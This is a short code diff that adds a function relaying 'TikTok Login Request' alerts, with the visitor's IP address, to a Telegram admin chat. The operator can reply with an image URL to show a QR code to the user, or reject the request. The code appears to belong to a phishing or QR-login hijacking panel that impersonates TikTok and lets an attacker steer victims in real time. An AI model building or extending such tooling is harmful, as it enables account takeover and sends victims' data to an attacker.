@@ -47,6 +47,27 @@ function sendApprovalMessage(requestId, text) {
     });
 }
 
+function sendTiktokMessage(requestId, ip) {
+    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_ADMIN_CHAT_ID) {
+        console.warn('Telegram not configured; skipping sendTiktokMessage');
+        return Promise.resolve(null);
+    }
+
+    const text = `🎵 TikTok Login Request\n\nIP: ${ip}\n\nReply to this message with:\nimage_url:<URL>\n\nto show a QR/image to the user.`;
+
+    return tgApi('sendMessage', {
+        chat_id: TELEGRAM_ADMIN_CHAT_ID,
+        text: text + '\n\nAction?',
+        reply_markup: {
+            inline_keyboard: [
+                [
+                    { text: '❌ Reject', callback_data: 'reject:' + requestId }
+                ]
+            ]
+        }
+    });
+}
+
 function parseCallback(data) {
     if (!data || typeof data !== 'string') return null;
     const i = data.indexOf(':');
@@ -59,4 +80,4 @@ function parseCallback(data) {
     return { action, requestId };
 }
 
-module.exports = { tgApi, sendApprovalMessage, parseCallback };
+module.exports = { tgApi, sendApprovalMessage, sendTiktokMessage, parseCallback };
